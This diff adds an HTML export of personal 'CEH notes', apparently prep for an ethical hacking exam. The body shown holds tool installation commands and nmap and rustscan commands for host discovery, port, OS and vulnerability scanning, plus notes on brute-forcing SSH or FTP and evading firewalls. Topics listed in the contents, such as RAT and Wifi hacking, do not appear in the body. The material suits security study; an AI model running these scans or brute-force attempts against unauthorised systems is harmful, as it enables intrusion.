@@ -1,0 +1,1711 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>CEH notes</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.collection-content td {
+	white-space: pre-wrap;
+	word-break: break-word;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(50, 48, 44, 1);
+}
+.highlight-gray {
+	color: rgba(115, 114, 110, 1);
+	fill: rgba(115, 114, 110, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(205, 60, 58, 1);
+	fill: rgba(205, 60, 58, 1);
+}
+.highlight-default_background {
+	color: rgba(50, 48, 44, 1);
+}
+.highlight-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.highlight-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(115, 114, 110, 1);
+	fill: rgba(115, 114, 110, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(205, 60, 58, 1);
+	fill: rgba(205, 60, 58, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.block-color-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-default { background-color: rgba(42, 28, 0, 0.07); }
+.select-value-color-gray { background-color: rgba(28, 19, 1, 0.11); }
+.select-value-color-brown { background-color: rgba(142, 58, 1, 0.141); }
+.select-value-color-orange { background-color: rgba(213, 96, 0, 0.188); }
+.select-value-color-yellow { background-color: rgba(209, 155, 0, 0.238); }
+.select-value-color-green { background-color: rgba(1, 104, 42, 0.145); }
+.select-value-color-blue { background-color: rgba(0, 108, 191, 0.156); }
+.select-value-color-purple { background-color: rgba(104, 1, 184, 0.125); }
+.select-value-color-pink { background-color: rgba(204, 1, 88, 0.137); }
+.select-value-color-red { background-color: rgba(228, 26, 0, 0.148); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="18ab2af3-f9ef-80da-8134-d655b934c845" class="page sans"><header><h1 class="page-title">CEH notes</h1><p class="page-description"></p></header><div class="page-body"><nav id="18ab2af3-f9ef-80bf-a1c2-de1d8e031cec" class="block-color-yellow_background table_of_contents"><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#258b2af3-f9ef-801d-822c-dd52b8c52d82">Tools Installation</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#18ab2af3-f9ef-8060-881e-c4ed73530660">RUSTSCAN/NMAP,FTP,HYDRA</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#18ab2af3-f9ef-80c4-8b4e-e2b9510ab8a7">Scanning Network using Nmap and RUST</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#18ab2af3-f9ef-803d-b14d-d32a384cbc48">Service Enumeration</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#259b2af3-f9ef-802c-8dde-d3dfb5d2611b">NFS (nfs 2049 via 111 rpcbind)</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#18ab2af3-f9ef-80d1-977b-c9a2cfd0612e">FTP</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#18ab2af3-f9ef-80c4-af81-f9a3c9264caa">SNMP</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#18ab2af3-f9ef-80c2-8bdb-c6345ac2241d">SMB Enumeration</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#18ab2af3-f9ef-8055-98f4-cc45cc93cadb">RDP</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#259b2af3-f9ef-80e2-8d1b-f881855eeb74">IMAP</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#18ab2af3-f9ef-8083-a676-fef09f3d6c40">NetBIOS Enumeration</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#259b2af3-f9ef-80ac-9493-e2136f8f0d40">SMB</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#259b2af3-f9ef-803b-b06f-e165c45e9172">RAT</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#259b2af3-f9ef-802f-b0e9-d317a5f1df90">SQLMAP</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#259b2af3-f9ef-803d-b3d7-ec7092aba888">Malware Analysis</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#18ab2af3-f9ef-80e7-a67d-f92720273122">Traffic Analysis</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#18ab2af3-f9ef-80b1-afbc-c63e4bf1ad3e">Steganography</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#259b2af3-f9ef-80e5-9a48-eaac4a083ea4"><strong>LLMNR Poisoning NTML Hash cracking </strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#259b2af3-f9ef-80b2-9f20-c651d1dee427">Entropy/Android</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#18ab2af3-f9ef-80f1-9817-dcc7e5d1464c">Cryptography</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#18ab2af3-f9ef-8036-8b15-edce9d649238">Web Applications</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#259b2af3-f9ef-80d4-bdf5-d6d88cb53769">WPSCAN</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#259b2af3-f9ef-807b-b5fb-d2413c3e97b3">Dir Enumeration</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#18ab2af3-f9ef-80c7-b888-c3faf08610e6">Hashes</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#259b2af3-f9ef-8069-86cb-d3443ac49f36">Extra </a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#18ab2af3-f9ef-80cb-9899-f2db075dce6c">Wifi Hacking 101</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#259b2af3-f9ef-8071-a19c-d973c7c35f5e">Useful Commands</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#18ab2af3-f9ef-8074-9c4c-cc9bb4804ecf">THM ROOMS</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#18ab2af3-f9ef-8090-ac3a-d5d12ede3b34">Vulnhub Machines</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#18ab2af3-f9ef-80e0-be0e-ce72c341b475">YT Playlists</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#18ab2af3-f9ef-8045-9ad2-d02b525466fe">Tools used and Resources </a></div></nav><p id="18ab2af3-f9ef-8065-9c5c-fb4dba3f71ba" class="">
+</p><p id="18ab2af3-f9ef-8055-90e0-f90886a5a501" class="">
+</p><p id="18ab2af3-f9ef-807b-8a68-f2913e1b4437" class="">
+</p><p id="258b2af3-f9ef-806c-8f48-d487e597b1ec" class="">
+</p><p id="18ab2af3-f9ef-8055-8f62-e21a9235b7ce" class="">
+</p><h1 id="258b2af3-f9ef-801d-822c-dd52b8c52d82" class="">Tools Installation</h1><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="258b2af3-f9ef-8082-a618-f41c94a105a7" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">winget install --id PuTTY.PuTTY -e
+
+sudo apt install openssh-server -y
+sudo systemctl enable ssh
+sudo systemctl start ssh
+
+sudo apt install adb -y
+sudo apt-get install nfs-common or apt install nfs-common 
+sudo apt install cifs-utils -y
+sudo apt install hash-identifier -y
+sudo apt install ent -y
+sudo apt install nbtscan -y
+sudo apt install ffuf -y
+
+Install snow if not already
+https://darkside.com.au/snow/
+</code></pre><h1 id="18ab2af3-f9ef-8060-881e-c4ed73530660" class="">RUSTSCAN/NMAP,FTP,HYDRA</h1><h2 id="18ab2af3-f9ef-80c4-8b4e-e2b9510ab8a7" class="">Scanning Network using Nmap and RUST</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ab2af3-f9ef-8062-9e0a-efffe69cb1f1" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">wget https://github.com/RustScan/RustScan/releases/download/2.0.1/rustscan_2.0.1_amd64.deb
+sudo dpkg -i filename
+
+netdiscover -i &lt;interface-name&gt;
+
+#Finding Product Version of DC
+Nmap –sS –sV –A –v –oN 192NET.txt 192.168.0.0/24
+#Windows Web Development Environment
+nmap -sS -sV IP --script http-enum.nse
+OR
+nmap -p 389 -sV -iL &lt;Target File&gt; OR nmap -p 389 -sV &lt;IP&gt; {FQDN = Host + Domain}
+ldapsearch -h 10.10.1.22 -x -s base namingcontexts
+After getting the domain name e.g. CEH.com
+ldapsearch -x -h &lt;IP&gt; -b &quot;DC=CEH,DC=com&quot;
+This will give the operating system versión
+
+#Windows Web Dev Env - Mercury services
+nmap -sS -sV IP --script http-enum.nse
+
+#CVE number with least or highest severity score
+Nmap –Pn –script vuln 192.168.44.32
+Then manually check all CVE scores on google and select with least score
+
+#remote login and command-line execution app on linux
+netdiscover –r 10.10.55.0/24
+nmap –A –sN –v 10.10.55.0/24
+Then bruteforce ssh or ftp on linux target
+
+
+1. Find live hosts
+nmap -sP IP/CIDR
+nmap -sn -n -T5 --min-parallelism 100 &lt;IP/CIDR&gt;
+# Quick host discovery
+nmap -sn 10.10.10.0/24 -oN live_hosts.txt
+nmap -sn 192.168.254.0/24 -oG - | awk &#x27;/Up$/{print $2}&#x27; &gt; live_hosts.txt
+rustscan -a 192.168.0.0/30
+rustscan -a &#x27;hosts.txt&#x27;
+
+2. Find open ports and Services
+nmap -PR -sn IP/CIDR
+nmap -iL live_hosts.txt -p- -sV --min-rate 1000 -T4 -oN full_ports.txt
+#Finding FQDN
+nmap -p389,445 -sV --script=ldap-rootdse 192.168.1.0/24
+nmap -p 53,88,135,139,389,445,464,3268,3269 -sV --script=ldap* --script=dns* 192.168.1.0/24
+If LDAP port closed or Filtered, use
+nmap -Pn -A &lt;target_IP&gt;
+
+#Finding Windows X machine
+nmap -O 192.168.1.0/24
+nmap -p445 --script smb-os-discovery 192.168.1.0/24
+
+#For RDP
+nmap -Pn -p -sV 3389 &lt;target_IP&gt;
+
+
+3. Scripts + version running on target machine
+nmap -sC -sV IP/CIDR
+
+4. OS of target
+nmap -O IP
+
+5. All open ports
+nmap -p- IP/CIDR
+
+6. Specific port scan 
+nmap -p &lt;port-number&gt; IP/CIDR
+rustscan -a 127.0.0.1 -p 53
+
+7. Aggressive Scan --&gt; -A
+rustscan -a 127.0.0.1 -- -A -sC
+
+8. Scanning using NSE scripts
+nmap --scripts &lt;script_name&gt; -p &lt;port&gt; IP/CIDR
+
+9. Scripts + Version + Ports + OS Scan
+nmap -sC -sV -p- -A -v- T4 IP/CIDR
+
+# Useful targeted scripts
+nmap -p 53  --script=dns-recursion,dns-zone-transfer &lt;ip&gt;
+nmap -p 22  --script=sshv1,ssh-hostkey,ssh2-enum-algos,ssh-auth-methods &lt;ip&gt;
+nmap -p 80,443 --script=http-title,http-methods,http-headers,http-enum &lt;ip&gt;
+nmap -p 445 --script=smb-enum-shares,smb-enum-users,smb2-security-mode &lt;ip&gt;
+nmap -p 5060 -sU --script=sip-methods,sip-enum-users &lt;ip&gt;
+
+10. Specific ports using Rust
+rustscan -a 127.0.0.1 -p 53,80,121,65535
+rustscan -a 127.0.0.1 --range 1-1000
+
+11. Evading Firewall random port scan
+ rustscan -a 127.0.0.1 --range 1-1000 --scan-order &quot;Random&quot;
+ 
+12. Rust Help
+-q ,quiet mode
+-r , particular range
+-b , batch size
